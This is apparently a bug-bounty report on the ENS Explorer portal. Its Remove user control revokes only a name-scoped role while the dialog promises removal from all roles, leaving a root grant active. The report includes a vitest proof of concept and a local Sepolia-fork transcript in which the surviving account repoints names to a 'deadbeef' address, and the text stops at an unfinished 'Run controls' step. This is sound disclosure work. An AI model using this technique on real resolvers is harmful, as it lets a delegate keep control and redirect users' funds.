# 90894 w a critical apps portal resolver roles ui remove user revokes only the name scope while confirming removal from all roles the root grant stays active

**Submitted on Aug 27th 2026 at 21:39:06 UTC by @aurorazz for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #90894
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as:
    * resolving or rendering an ENS name to an attacker-controlled address
    * showing the wrong recipient or amount on a transaction the user then approves

## Description

## Intro

The Explorer's resolver Roles page unions every scope an account holds into one table row, and its Remove user control revokes only one name-scoped slice of that row while the confirmation dialog tells the operator they are removing the user from all roles. The transaction succeeds, the interface reports success, yet the account's global authority survives and the account can still repoint any name on that resolver to an address the operator never approved. A delegate can create the merged-row precondition with a single routine grant request, making the application's ejection control structurally unable to ever remove their global grant.

## Vulnerability Details

### Scope

apps/portal — the Explorer app (Files). Exactly three files:

* `src/lib/roles/resolverRoles.ts` — groups every scope an account holds into one table row
* `src/features/resolver/components/ResolverRolesSidebar.tsx` — picks the scope for every action taken on that row
* `src/features/resolver/helpers/revokeResolverRoles.ts` — maps that pick to the on-chain call the operator signs

The fix is a one-line change in `ResolverRolesSidebar.tsx`; nothing outside apps/portal changes.

### The defect

One row per account, built by `groupRolesByAccount`. Every scope's decoded roles accumulate into `decodedRoles`; every scope's name accumulates into `resolvedNames`:

```ts
  for (const role of roles) {
    const account = role.account.toLowerCase()
    const resource = role.resource.toLowerCase()
    const decoded = decodeResolverRoleBitmap(role.roleBitmap)
    const resolvedName = resourceToName?.get(resource) ?? null

    const existing = grouped.get(account)

    if (existing) {
      existing.roles.push(role)
      existing.decodedRoles.push(...decoded)
      if (resolvedName) existing.resolvedNames.add(resolvedName)
    } else {
      const names = new Set<string>()
      if (resolvedName) names.add(resolvedName)
      grouped.set(account, {
        account,
        resolvedNames: names,
        roles: [role],
        decodedRoles: [...decoded],
      })
    }
  }
```

(`resolverRoles.ts:193-215`, inside [`groupRolesByAccount`, `resolverRoles.ts#L179-L221`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/lib/roles/resolverRoles.ts#L179-L221).)

The sidebar then treats the first non-root name in that merged list as the scope for every action on the row:

```ts
  const roleName = resolvedNames.find((n) => n !== '(root)') ?? ''
```

([`ResolverRolesSidebar.tsx#L169`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L169).)

And on Remove user it sends the union of `decodedRoles` with that single name:

```ts
  const handleRemoveUser = () => {
    if (
      !selectedAccount ||
      decodedRoles.length === 0 ||
      removeUserMutation.isPending
    )
      return

    removeUserMutation.reset()
    setPendingAction({
      type: 'remove',
      name: roleName,
      account: selectedAccount,
      roles: decodedRoles,
    })
    openModal()
  }
```

([`ResolverRolesSidebar.tsx#L307-L323`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L307-L323).)

Finally, the revoke helper picks the root path only when the picked name is the empty string:

```ts
  const writeParams = revokeResolverRolesWriteParameters(
    walletClient as Parameters<typeof revokeResolverRolesWriteParameters>[0],
    name === ''
      ? {
          resolverAddress,
          targetAccount: account,
          scope: 'root',
          roles: roles as ResolverRole[],
        }
      : {
          resolverAddress,
          targetAccount: account,
          scope: 'name',
          name,
          roles: roles as ResolverRole[],
        },
  )
```

([`revokeResolverRoles.ts#L45-L61`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/helpers/revokeResolverRoles.ts#L45-L61).)

Union row, first non-root name picked as the scope for every action, and a mixed row can never take the root path: on an account holding both root and any name-scoped grant, `roleName` is that name, never the empty string, so the root removal branch is structurally unreachable from this flow.

### Observed behaviour in the Explorer

The portal was run live against the fork, with the indexer route serving the fork's readbacks; the roles data it displayed is fixture data mirroring those readbacks, and the name page's record data likewise mirrors the fork's readbacks.

#### (i) Observed at signature time: the dialog promises removal from all roles

Clicking Remove user on the merged row opens a confirmation dialog whose text, in full:

```tsx
              <DialogTitle>Remove user</DialogTitle>
              <DialogDescription>
                Are you sure you want to remove this user from all roles? This
                action cannot be undone.
              </DialogDescription>
```

([`ResolverRolesSidebar.tsx#L444-L448`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L444-L448), copy at [`:446-L447`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L446-L447).)

Confirming opens the transaction modal titled `Remove resolver user`, transaction name `Remove user ${account}` ([`:339-L344`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L339-L344)); in the run the modal sat at its waiting state while the wallet held the unsigned transaction built in The defect above.

Captures:

* `captures/1-confirm-dialog.png` — the dialog over the merged row
* `captures/1b-tx-modal-pending.png`
* `captures/1c-awaiting-wallet.png` — the modal pending on the wallet, the sidebar copy behind it

#### (ii) Observed after the confirmed removal: the account is still listed, still global

The removal transaction succeeded and the flow closed in its success state. The refetched table still listed the account, its Name column reduced to `(root)` — the name-scope slice revoked, the global grant not — and the row's sidebar still opened under the subtitle rendered from the merged scope list:

```tsx
                {selectedAccount && resolvedNames.length > 0 && (
                  <p className="text-sm text-muted-foreground">
                    {resolvedNames.includes('(root)')
                      ? 'Global roles (all names)'
                      : `Roles scoped to ${resolvedNames.filter((n) => n !== '(root)').join(', ')}`}
                  </p>
```

([`ResolverRolesSidebar.tsx#L391-L396`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L391-L396).)

After the confirmed removal, the mutation's success handler waits for the indexer and refetches:

```ts
    onSuccess: async () => {
      await pollForIndexerSync({
        invalidateQueries: () =>
          queryClient.invalidateQueries({
            queryKey: ['resolver-overview'],
            refetchType: 'all',
          }),
      })
    },
  })
```

([`ResolverRolesSidebar.tsx#L278-L287`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L278-L287); the roles table is fed by the same `resolver-overview` query, [`roles/index.tsx#L35-L39`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/routes/resolver/%24address/roles/index.tsx#L35-L39).)

The removal transaction revoked only the name slice, so the root record persisted, so the regrouped row still contained `(root)` in `resolvedNames`, so the refreshed row rendered the same `Global roles (all names)` subtitle it carried before the removal. Survival was presented as normalcy.

Captures:

* `captures/0-sidebar-mixed-row.png` — the row before the removal, both scopes merged into one row
* `captures/2-table-after-removal.png` — after the confirmed removal: the row remains, `(root)` only
* `captures/2b-sidebar-after-removal.png` — the surviving row's sidebar re-opened after the removal, still under `Global roles (all names)`

#### (iii) Observed on the name page: the Explorer renders the address the removed account chose

The global grant survived the removal, and the removed account used it to write an address record for a name on that resolver; the write is real on the fork. The name page was then served that same value through the mocked records route, which returns the fork's own readback of the record. The Explorer's name page at `/<name>/address`, titled `Address Resolution`, rendered it as the name's resolution for the default coin type — an address the operator never approved.

The page builds its rows from the name's coin records:

```ts
  const addressByCoinType = new Map(
    (profileQuery.data?.records?.coins ?? []).map(
      (c) => [c.coinType, c.value] as const,
    ),
  )
```

([`routes/$name/address.tsx#L104-L108`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/routes/%24name/address.tsx#L104-L108)), each row's `address` being that coin's resolved value ([`address.tsx#L69-L88`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/routes/%24name/address.tsx#L69-L88)), rendered by `AddressResolutionTable` ([`address.tsx#L224-L228`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/routes/%24name/address.tsx#L224-L228)).

In production those records are fetched through ensjs `getRecords` against the name's resolver ([`useRecords.ts#L19-L30`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/profile/hooks/useRecords.ts#L19-L30)); in the run the mocked records route returned the fork's readback of the same record. The page has no opinion of its own; it displays whatever it is served.

Capture: `captures/3-name-page-deadbeef.png` — the name page rendering the written record as the name's resolution.

## Impact Details

Critical. The operator confirms a dialog that promises removal from all roles (observation i under Vulnerability Details). The transaction the application then builds and the operator signs performs a fraction of that promise and reports success. The refreshed UI presents the surviving grant as ordinary state, under the same subtitle the row carried before (observation ii under Vulnerability Details). And the rendering harm is the selected impact class's first listed example: a name on that resolver resolving to an address the operator never approved, displayed as fact by the application's own name pages (observation iii under Vulnerability Details). Anyone who sends funds to that name, in the Explorer or in any wallet or client reading that resolver, sends them to the unintended recipient.

The precondition is not exotic, and a delegate can create it deliberately. The Add-user sheet defaults its scope to the root resource ([`ResolverAddUserSheet.tsx#L127`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverAddUserSheet.tsx#L127)), and the resolver owner holds the full root init bitmap, so mixed rows are the natural state of this page, not a corner case. A delegate holding root requests one innocuous name-scoped grant on a name they already work on. From that point Remove user is structurally incapable of stripping their root grant while confirming success on every attempt. What the delegate gains is not a permission; it is immunity from revocation. The authority that changes hands is the operator's.

Recovery requires the operator to disbelieve a success confirmation the application has just given them. The flow ends in a success state and the sidebar closes on it ([`ResolverRolesSidebar.tsx#L503-L508`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L503-L508)). The app waits for the indexer to sync and refetches ([`#L278-L287`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L278-L287)), and the account reappears in the table with its remaining global roles, under the same `Global roles (all names)` subtitle the mixed row had before. In an application whose tables trail chain state, a row still present after a confirmed removal reads as indexer lag. The one signal that would expose the partial revoke is the one the interface trains operators to discount. The retained grant has no expiry.

## References

Repo pinned at [1c9b47f18fcddd2e864dfe385c4171061c9811ae](https://github.com/immunefi-team/audit-comp-ens/tree/1c9b47f18fcddd2e864dfe385c4171061c9811ae). All portal line ranges below were verified against the pinned clone.

* [resolverRoles.ts#L179-L221](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/lib/roles/resolverRoles.ts#L179-L221) — `groupRolesByAccount`, the union/merge (merge loop at L193-215)
* [ResolverRolesSidebar.tsx#L169](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L169) — the scope pick
* [ResolverRolesSidebar.tsx#L307-L323](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L307-L323) — `handleRemoveUser`
* [ResolverRolesSidebar.tsx#L391-L396](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L391-L396) — the `Global roles (all names)` subtitle
* [ResolverRolesSidebar.tsx#L446-L447](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L446-L447) — the remove-dialog copy
* [ResolverRolesSidebar.tsx#L503-L508](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L503-L508) — `onDone` closes the sidebar on success
* [ResolverRolesSidebar.tsx#L278-L287](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L278-L287) — refetch after indexer sync
* [revokeResolverRoles.ts#L45-L61](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/helpers/revokeResolverRoles.ts#L45-L61) — the scope ternary (grant side: `grantResolverRoles.ts`)
* [ResolverAddUserSheet.tsx#L127](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverAddUserSheet.tsx#L127) — Add-user sheet defaults to the root scope (`ROOT_NODE_VALUE`, defined at L38-39)
* [roles/index.tsx#L41-L50](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/routes/resolver/%24address/roles/index.tsx#L41-L50) — the roles route and its table query (L35-L39)
* [routes/$name/address.tsx#L104-L108](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/routes/%24name/address.tsx#L104-L108) — name page builds rows from the resolver's coin records (rendered at L69-L88 and L224-L228)
* [useRecords.ts#L19-L30](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/profile/hooks/useRecords.ts#L19-L30) — records are read through ensjs against the name's resolver

## Proof of Concept

### Client-side reproduction

The vitest file below was written for this report. It imports the portal's own source files unmodified and drives the app's grouping (`groupRolesByAccount`), the sidebar's verbatim scope pick, and the app's own transaction builders with the two indexer records of a mixed row, substituting nothing for portal code, and asserts what each prepared transaction actually is; a control case shows a root-only row does reach the root removal branch, so the gate works where the row is not mixed.

Run:

```sh
pnpm install && pnpm -C apps/portal exec vitest run scripts/remove-user-mixed-scope.test.ts
```

```ts
import type { WalletClient } from 'viem'
import { toFunctionSelector } from 'viem'
import { describe, expect, it } from 'vitest'
import {
  buildResourceToNameMap,
  computeNameResource,
  groupRolesByAccount,
  type ResolverRoleKey,
} from '../src/lib/roles/resolverRoles'
import {
  computeRoleChanges,
  roleToPermissions,
} from '../src/lib/roles/rolesToPermissions'
import { prepareGrantResolverRolesTransaction } from '../src/features/resolver/helpers/grantResolverRoles'
import { prepareRevokeResolverRolesTransaction } from '../src/features/resolver/helpers/revokeResolverRoles'

const RESOLVER_ADDRESS =
  '0xa1c8256043f3bdd5b683f570db40bc936b7dd294' as const
const OPERATOR = '0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266' as const
const ACCOUNT = '0x70997970C51812dc3A010C7d01b50e0d17dc79C8' as const

const ROOT_RESOURCE =
  '0x0000000000000000000000000000000000000000000000000000000000000000'
const HARMONIA_RESOURCE = computeNameResource('harmonia.eth')
const OTHER_RESOURCE = computeNameResource('other.eth')

const walletClient = {
  account: { address: OPERATOR },
  chain: { id: 11155111 },
} as WalletClient

const requestOf = (intent: unknown) =>
  (intent as { request: { to: string; data: `0x${string}` } }).request

// authorizeNameRoles(bytes,uint256,address,bool)
const AUTHORIZE_NAME_ROLES = toFunctionSelector(
  'authorizeNameRoles(bytes,uint256,address,bool)',
)
// revokeRootRoles(uint256,address)
const REVOKE_ROOT_ROLES = toFunctionSelector('revokeRootRoles(uint256,address)')

const word = (data: string, i: number) =>
  data.toLowerCase().slice(2 + 8 + i * 64, 2 + 8 + (i + 1) * 64)

// The exact sidebar scope selection (ResolverRolesSidebar.tsx:166-169):
const sidebarScopeFor = (row: { resolvedNames: readonly string[] }) =>
  row.resolvedNames.find((name) => name !== '(root)') ?? ''

const prepareRemove = (name: string, roles: readonly ResolverRoleKey[]) =>
  requestOf(
    prepareRevokeResolverRolesTransaction({
      resolverAddress: RESOLVER_ADDRESS,
      name,
      account: ACCOUNT,
      roles,
      walletClient,
      chainId: 11155111,
    }),
  )

describe('Resolver roles sidebar scope selection (mixed rows)', () => {
  it('Remove user on a mixed row prepares only a name-scoped removal', () => {
    const roleRecords = [
      { account: ACCOUNT, resource: ROOT_RESOURCE, roleBitmap: '1' },
      { account: ACCOUNT, resource: HARMONIA_RESOURCE, roleBitmap: '16' },
    ]
    const rows = groupRolesByAccount(
      roleRecords,
      buildResourceToNameMap([{ name: 'harmonia.eth' }]),
    )
    const row = rows[0]

    expect(row.decodedRoles).toEqual(['ROLE_SET_ADDR', 'ROLE_SET_TEXT'])
    expect(row.resolvedNames).toEqual(['(root)', 'harmonia.eth'])

    const roleName = sidebarScopeFor(row)
    expect(roleName).toBe('harmonia.eth')

    const { to, data } = prepareRemove(roleName, row.decodedRoles as ResolverRoleKey[])

    expect(to.toLowerCase()).toBe(RESOLVER_ADDRESS.toLowerCase())
    expect(data.slice(0, 10).toLowerCase()).toBe(AUTHORIZE_NAME_ROLES)
    // bitmap word = union of both scopes' displayed roles (0x11)
    expect(word(data, 1)).toBe(BigInt(0x11).toString(16).padStart(64, '0'))

    console.log('row roles:', row.decodedRoles)
    console.log('row scopes:', row.resolvedNames)
    console.log('scope selected by sidebar:', roleName === '' ? 'root' : 'name')
    console.log('global removal branch reached:', roleName === '')
  })

  it('CONTROL: a root-only row reaches the root removal branch', () => {
    const roleRecords = [
      { account: ACCOUNT, resource: ROOT_RESOURCE, roleBitmap: '17' },
    ]
    const rows = groupRolesByAccount(
      roleRecords,
      buildResourceToNameMap([{ name: 'harmonia.eth' }]),
    )
    const row = rows[0]

    expect(row.resolvedNames).toEqual(['(root)'])
    const roleName = sidebarScopeFor(row)
    expect(roleName).toBe('')

    const { data } = prepareRemove(roleName, row.decodedRoles as ResolverRoleKey[])

    expect(data.slice(0, 10).toLowerCase()).toBe(REVOKE_ROOT_ROLES)
    // args: [bitmap, account] — bitmap 0x11 for both roles, account word next
    expect(word(data, 0)).toBe(BigInt(0x11).toString(16).padStart(64, '0'))
    expect(word(data, 1)).toBe(ACCOUNT.toLowerCase().replace('0x', '').padStart(64, '0'))

    console.log('root-only row scopes:', row.resolvedNames)
    console.log('scope selected by sidebar: root')
    console.log('root removal branch reached: true (revokeRootRoles calldata)')
  })

  it('a multi-name mixed row removes only the FIRST name; the root grant AND the second name grant are never addressed', () => {
    const roleRecords = [
      { account: ACCOUNT, resource: ROOT_RESOURCE, roleBitmap: '1' },
      { account: ACCOUNT, resource: HARMONIA_RESOURCE, roleBitmap: '16' },
      { account: ACCOUNT, resource: OTHER_RESOURCE, roleBitmap: '16' },
    ]
    const rows = groupRolesByAccount(
      roleRecords,
      buildResourceToNameMap([{ name: 'harmonia.eth' }, { name: 'other.eth' }]),
    )
    const row = rows[0]

    expect(row.resolvedNames).toEqual([
      '(root)',
      'harmonia.eth',
      'other.eth',
    ])

    const roleName = sidebarScopeFor(row)
    expect(roleName).toBe('harmonia.eth') // first non-root name wins

    const { data } = prepareRemove(roleName, row.decodedRoles as ResolverRoleKey[])

    expect(data.slice(0, 10).toLowerCase()).toBe(AUTHORIZE_NAME_ROLES)
    // dns('harmonia.eth') is addressed...
    expect(data.toLowerCase()).toContain('086861726d6f6e696103657468')
    // ...dns('other.eth') never appears in any prepared call
    expect(data.toLowerCase()).not.toContain('6f74686572')

    console.log('row scopes:', row.resolvedNames)
    console.log('scope selected by sidebar:', roleName)
    console.log(
      'scopes never addressed by any prepared transaction: (root), other.eth',
    )
  })

  it('Save (checkbox revoke of a root-held role) also goes name-scoped — the root grant survives the edit', () => {
    const roleRecords = [
      { account: ACCOUNT, resource: ROOT_RESOURCE, roleBitmap: '1' },
      { account: ACCOUNT, resource: HARMONIA_RESOURCE, roleBitmap: '16' },
    ]
    const rows = groupRolesByAccount(
      roleRecords,
      buildResourceToNameMap([{ name: 'harmonia.eth' }]),
    )
    const row = rows[0]
    const roleName = sidebarScopeFor(row)

    // Operator unchecks the ROLE_SET_ADDR Manager checkbox (ResolverRolesSidebar
    // EditPermissionList) — the role shown on the row lives at root scope.
    const edited = roleToPermissions(row.decodedRoles)
    edited.set('ROLE_SET_ADDR', { admin: false, manager: false })

    const { rolesToGrant, rolesToRevoke } = computeRoleChanges(
      [...row.decodedRoles],
      edited,
    )
    expect(rolesToGrant).toEqual([])
    expect(rolesToRevoke).toEqual(['ROLE_SET_ADDR'])

    // saveMutation passes the same first-non-root name (ResolverRolesSidebar:299)
    const { data } = prepareRemove(roleName, rolesToRevoke)

    expect(data.slice(0, 10).toLowerCase()).toBe(AUTHORIZE_NAME_ROLES)
    // bitmap word = 0x1 (ROLE_SET_ADDR only), authorized=false
    expect(word(data, 1)).toBe(BigInt(1).toString(16).padStart(64, '0'))
    expect(word(data, 3)).toBe('0'.repeat(64))

    console.log('operator edit: uncheck Set Address (held at root)')
    console.log('scope the revoke is prepared for:', roleName)
    console.log(
      'effect on roles(ROOT_RESOURCE, account): none — the call clears bit 0 on the harmonia.eth resource, where the account bitmap is 0x10; the root bitmap 0x1 is untouched',
    )
  })

  it('Save (checkbox grant on a mixed row) grants at the first name only, while the row displays the role account-wide', () => {
    const roleRecords = [
      { account: ACCOUNT, resource: ROOT_RESOURCE, roleBitmap: '1' },
      { account: ACCOUNT, resource: HARMONIA_RESOURCE, roleBitmap: '16' },
    ]
    const rows = groupRolesByAccount(
      roleRecords,
      buildResourceToNameMap([{ name: 'harmonia.eth' }]),
    )
    const row = rows[0]
    const roleName = sidebarScopeFor(row)

    // Operator checks the Set Content Hash Manager checkbox.
    const edited = roleToPermissions(row.decodedRoles)
    edited.set('ROLE_SET_CONTENTHASH', { admin: false, manager: true })

    const { rolesToGrant, rolesToRevoke } = computeRoleChanges(
      [...row.decodedRoles],
      edited,
    )
    expect(rolesToGrant).toEqual(['ROLE_SET_CONTENTHASH'])
    expect(rolesToRevoke).toEqual([])

    const { data } = requestOf(
      prepareGrantResolverRolesTransaction({
        resolverAddress: RESOLVER_ADDRESS,
        name: roleName,
        account: ACCOUNT,
        roles: rolesToGrant as never[],
        walletClient,
        chainId: 11155111,
      }),
    )

    expect(data.slice(0, 10).toLowerCase()).toBe(AUTHORIZE_NAME_ROLES)
    // bitmap word = 0x100 (ROLE_SET_CONTENTHASH), authorized=true
    expect(word(data, 1)).toBe(BigInt(0x100).toString(16).padStart(64, '0'))
    expect(word(data, 3)).toBe('0'.repeat(63) + '1')

    console.log('operator edit: check Set Content Hash')
    console.log('scope the grant is prepared for:', roleName)
    console.log(
      'row display after sync: ROLE_SET_CONTENTHASH appears in the combined row (shown as "Global roles (all names)" when root is present), but the grant is only readable on the harmonia.eth resource',
    )
  })
})
```

Output of my run (vitest 4.1.5, repo pinned at 1c9b47f18fcddd2e864dfe385c4171061c9811ae, `pnpm -C apps/portal exec vitest run scripts/remove-user-mixed-scope.test.ts`):

```
row roles: [ 'ROLE_SET_ADDR', 'ROLE_SET_TEXT' ]
row scopes: [ '(root)', 'harmonia.eth' ]
scope selected by sidebar: name
global removal branch reached: false

root-only row scopes: [ '(root)' ]
scope selected by sidebar: root
root removal branch reached: true (revokeRootRoles calldata)

row scopes: [ '(root)', 'harmonia.eth', 'other.eth' ]
scope selected by sidebar: harmonia.eth
scopes never addressed by any prepared transaction: (root), other.eth

operator edit: uncheck Set Address (held at root)
scope the revoke is prepared for: harmonia.eth
effect on roles(ROOT_RESOURCE, account): none — the call clears bit 0 on the harmonia.eth resource, where the account bitmap is 0x10; the root bitmap 0x1 is untouched

operator edit: check Set Content Hash
scope the grant is prepared for: harmonia.eth
row display after sync: ROLE_SET_CONTENTHASH appears in the combined row (shown as "Global roles (all names)" when root is present), but the grant is only readable on the harmonia.eth resource

Test Files  1 passed (1)
     Tests  5 passed (5)
```

The test proves the wrong-scope removal is produced by the app's own unmodified grouping, scope pick, and transaction builder: nothing in the harness substitutes for portal code except the two indexer records the fork readbacks in the appendix print and a structural stub wallet client carrying only the operator address and chain id.

## Appendix: on-chain consequence

The ENS smart contracts are not claimed defective; they behave exactly as designed in every control executed below and appear only as the execution environment for the transaction the application builds.

### a. Measured on the production deployments (fork of live Sepolia, block 11553325)

```
pre-state:   roles(0, B) = 1, roles(resource, B) = 16
UI remove:   authorizeNameRoles(dns("harmonia.eth"), 0x11, B, false) -> status 0x1
post-state:  roles(0, B) = 1  (root RETAINED),   roles(resource, B) = 0
removed B writes addr(node("harmonia.eth"), 60) = 0x...deadbeef  -> succeeds
removed B writes addr(node("crypto.eth"), 60)  = 0x...deadbeef   -> succeeds
             (crypto.eth line is the retained grant's blast radius, not a second bug)
```

### b. Why nothing reverts

One contract detail explains why nothing reverts, and it is the contract behaving as designed: `_revokeRoles` clears with `uint256 updatedRoles = currentRoles & ~roleBitmap;` (verbatim) and does not revert on bits the account does not hold at that resource. The root bits in the union mask are ignored rather than rejected; the app is what hands the contract a mask it can only partially honor. Wrong scope plus the non-reverting clear is what produces a successful transaction carrying a false confirmation.

### c. Fork transcript (complete)

Environment: foundry (anvil + cast). Fork of live Sepolia pinned to block 11553325 (transcript executed at that block; deterministic).

Contracts (used as the execution environment for the app's transaction):

```
VerifiableFactory 0x10dC6333CDFe1FCEf624c6e0a8221b91804Cd7ef
PermissionedResolverImpl 0x9EAe5C2730a7dD16BDD1DeE6421a1B91e3B0365e
```

{% stepper %}
{% step %}

## Start the fork

```sh
anvil --fork-url https://ethereum-sepolia-rpc.publicnode.com --fork-block-number 11553325 --chain-id 11155111 --port 8545
```

{% endstep %}

{% step %}

## Set environment variables

```sh
RPC=http://127.0.0.1:8545
FACTORY=0x10dC6333CDFe1FCEf624c6e0a8221b91804Cd7ef
IMPL=0x9EAe5C2730a7dD16BDD1DeE6421a1B91e3B0365e
A=0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
PK_A=0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
B=0x70997970C51812dc3A010C7d01b50e0d17dc79C8
PK_B=0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d
Z=0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC
PK_Z=0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a
C2=0xa1c8256043f3bdd5b683f570db40bc936b7dd294
SALT=0xe31a7f93245359127604e49b10a834c7c995d4ecc83b2ca3e32df518871decf3
INIT=0x7058b559000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb92266111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000000
DNS=0x086861726d6f6e69610365746800
NODE1=0xb118836f8aa469304ea88f775a3944618596e58dbbaadb78b1e92bde67dd6ffc
NODE2=0xf1349714113694d6ed77f7a709bf992fc0297ad9e820d3083f0ab95376e51c02
RES=0x4234bb81fe55340abfd83a35ea9be4edc9ccb26e197dc842ec4137e9a03d1de1
EVIL=0x00000000000000000000000000000000DeaDBeef
```

{% endstep %}

{% step %}

## Setup

```sh
# 1. deploy resolver via the app's own encoding (owner A, full root init bitmap)
cast send $FACTORY "deployProxy(address,uint256,bytes)" $IMPL $SALT $INIT --from $A --private-key $PK_A --rpc-url $RPC --gas-limit 3000000
# -> status 0x1, resolver at $C2

# 2. operator grants B root ROLE_SET_ADDR (the Add-user sheet's default scope)
cast send $C2 "grantRootRoles(uint256,address)" 1 $B --from $A --private-key $PK_A --rpc-url $RPC --gas-limit 300000

# 3. operator grants B name-scope ROLE_SET_TEXT on harmonia.eth (the innocuous request)
cast send $C2 "authorizeNameRoles(bytes,uint256,address,bool)" $DNS 0x10 $B true --from $A --private-key $PK_A --rpc-url $RPC --gas-limit 300000

# pre-state: the mixed row the sidebar shows
cast call $C2 "roles(uint256,address)(uint256)" 0 $B --rpc-url $RPC
# -> 1
cast call $C2 "roles(uint256,address)(uint256)" $RES $B --rpc-url $RPC
# -> 16
```

{% endstep %}

{% step %}

## Execute the application's removal transaction

```sh
cast send $C2 "authorizeNameRoles(bytes,uint256,address,bool)" $DNS 0x11 $B false --from $A --private-key $PK_A --rpc-url $RPC --gas-limit 300000
# -> status 0x1
```

{% endstep %}

{% step %}

## Verify post-state

Expected zero everywhere; actual:

```sh
cast call $C2 "roles(uint256,address)(uint256)" 0 $B --rpc-url $RPC
# -> 1    <== ROOT ROLE STILL THERE
cast call $C2 "roles(uint256,address)(uint256)" $RES $B --rpc-url $RPC
# -> 0    <== only the name part died
```

{% endstep %}

{% step %}

## Verify the remaining resolver-wide authority

```sh
cast send $C2 "setAddr(bytes32,uint256,bytes)" $NODE1 60 $EVIL --from $B --private-key $PK_B --rpc-url $RPC --gas-limit 300000
cast call $C2 "addr(bytes32,uint256)(bytes)" $NODE1 60 --rpc-url $RPC
# -> 0x00000000000000000000000000000000deadbeef

cast send $C2 "setAddr(bytes32,uint256,bytes)" $NODE2 60 $EVIL --from $B --private-key $PK_B --rpc-url $RPC --gas-limit 300000
cast call $C2 "addr(bytes32,uint256)(bytes)" $NODE2 60 --rpc-url $RPC
# -> 0x00000000000000000000000000000000deadbeef
```

{% endstep %}

{% step %}

## Run controls

```sh
